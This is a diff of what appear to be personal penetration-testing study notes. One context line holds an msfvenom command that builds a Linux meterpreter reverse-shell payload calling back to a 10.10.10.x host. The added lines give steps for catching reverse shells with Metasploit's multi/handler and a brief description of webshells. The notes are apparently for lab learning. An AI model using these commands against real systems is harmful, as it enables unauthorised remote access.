@@ -80,3 +80,16 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10
 
 ### Metasploit multi/handler
 - tool for catching reverse shells. 
+*how to use?*
+1. open metasploit `msfconsole`
+2. type `use multi/handler` and press enter
+3. `set PAYLOAD <payload>
+4. `set LHOST <listen-address>`
+5. `set LPORT <listen-port>`
+6. `exploit -j`
+
+### webshells
+- a script that runs inside a webserver, which executes code on the server.
+- after uploading vulnerability, we can execute that file directly on the server with the command of our desire in the `url`
+>[!Demo] 
+
